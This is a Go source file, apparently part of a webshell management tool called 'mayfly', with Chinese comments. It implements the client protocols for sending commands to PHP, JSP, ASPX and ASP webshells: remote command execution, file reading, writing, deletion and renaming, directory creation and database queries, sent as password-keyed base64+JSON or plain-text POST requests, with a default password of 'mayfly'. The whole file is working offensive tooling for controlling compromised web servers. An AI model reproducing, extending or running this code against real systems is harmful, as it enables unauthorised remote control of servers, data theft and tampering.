package adapters

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"time"

	"mayfly/internal/crypto"
	"mayfly/internal/model"
	"mayfly/internal/protocol"
	"mayfly/internal/transport"
)

// opToAction 操作类型 → webshell action 名称映射
var opToAction = map[protocol.OperationType]string{
	protocol.OpCommand:    "cmd",
	protocol.OpSysInfo:    "sysinfo",
	protocol.OpListDir:    "fileList",
	protocol.OpReadFile:   "fileRead",
	protocol.OpWriteFile:  "fileWrite",
	protocol.OpDeleteFile: "fileDelete",
	protocol.OpRenameFile: "fileRename",
	protocol.OpMkdir:      "fileMkdir",
	protocol.OpDBQuery:    "dbQuery",
}

// resolvePassword 解密目标密码，默认 mayfly
func resolvePassword(target *model.Target) string {
	pw, err := crypto.Decrypt(target.Password)
	if err != nil || pw == "" {
		return "mayfly"
	}
	return pw
}

// base64ProtocolExecute base64+JSON 协议（PHP / JSP / ASPX 共用）
//
// 请求: POST {password}=base64(json({action, params}))
// 响应: base64(json({status, data, message}))  其中 data 字段也是 base64 编码
func base64ProtocolExecute(ctx context.Context, t transport.Transport, target *model.Target, op *protocol.Operation) (*protocol.Result, error) {
	password := resolvePassword(target)

	action, ok := opToAction[op.Type]
	if !ok {
		return nil, fmt.Errorf("不支持的操作类型: %s", op.Type)
	}

	// 构建 params，fileWrite 的 content 需要 base64 编码
	params := make(map[string]string)
	for k, v := range op.Params {
		if op.Type == protocol.OpWriteFile && k == "content" {
			params[k] = base64.StdEncoding.EncodeToString([]byte(v))
		} else {
			params[k] = v
		}
	}

	// 构建请求 payload
	payload := map[string]interface{}{
		"action": action,
		"params": params,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("编码请求失败: %w", err)
	}
	encoded := base64.StdEncoding.EncodeToString(jsonData)

	// POST 表单: {password}={base64(json)}
	form := url.Values{}
	form.Set(password, encoded)

	timeout := 120 * time.Second
	if target.Timeout > 0 {
		timeout = time.Duration(target.Timeout) * time.Second
	}

	resp, err := t.Request(ctx, &transport.Request{
		Method:  "POST",
		URL:     target.URL,
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		Body:    []byte(form.Encode()),
		Timeout: timeout,
	})
	if err != nil {
		return &protocol.Result{Status: "error", Message: err.Error()}, err
	}

	body := strings.TrimSpace(string(resp.Body))

	// 解码外层 base64
	decoded, err := base64.StdEncoding.DecodeString(body)
	if err != nil {
		// 可能是明文错误信息
		return &protocol.Result{
			Status:  "error",
			Data:    resp.Body,
			Message: body,
		}, nil
	}

	// 解析 JSON
	var shellResp struct {
		Status  string `json:"status"`
		Data    string `json:"data"`
		Message string `json:"message"`
	}
	if err := json.Unmarshal(decoded, &shellResp); err != nil {
		return &protocol.Result{
			Status:  "error",
			Data:    decoded,
			Message: "解析响应失败: " + err.Error(),
		}, nil
	}

	// 解码内层 base64 (data 字段)
	var outputData []byte
	if shellResp.Data != "" {
		outputData, err = base64.StdEncoding.DecodeString(shellResp.Data)
		if err != nil {
			// 解码失败，直接使用原始字符串
			outputData = []byte(shellResp.Data)
		}
	}

	msg := shellResp.Message
	if shellResp.Status == "ok" && msg == "" {
		msg = resp.Duration.String()
	}

	return &protocol.Result{
		Status:  shellResp.Status,
		Data:    outputData,
		Message: msg,
	}, nil
}

// aspProtocolExecute ASP 明文协议
//
// 请求: POST {password}=action&cmd=ls&path=/...
// 响应: 纯文本
func aspProtocolExecute(ctx context.Context, t transport.Transport, target *model.Target, op *protocol.Operation) (*protocol.Result, error) {
	password := resolvePassword(target)

	action, ok := opToAction[op.Type]
	if !ok {
		return nil, fmt.Errorf("不支持的操作类型: %s", op.Type)
	}

	// ASP: {password}=action，其他参数直接作为表单字段
	form := url.Values{}
	form.Set(password, action)
	for k, v := range op.Params {
		form.Set(k, v)
	}

	timeout := 120 * time.Second
	if target.Timeout > 0 {
		timeout = time.Duration(target.Timeout) * time.Second
	}

	resp, err := t.Request(ctx, &transport.Request{
		Method:  "POST",
		URL:     target.URL,
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		Body:    []byte(form.Encode()),
		Timeout: timeout,
	})
	if err != nil {
		return &protocol.Result{Status: "error", Message: err.Error()}, err
	}

	body := strings.TrimSpace(string(resp.Body))

	// ASP 返回纯文本，检查是否是错误
	if strings.HasPrefix(body, "error:") || strings.HasPrefix(body, "Error") {
		return &protocol.Result{
			Status:  "error",
			Message: body,
		}, nil
	}

	return &protocol.Result{
		Status:  "ok",
		Data:    resp.Body,
		Message: resp.Duration.String(),
	}, nil
}
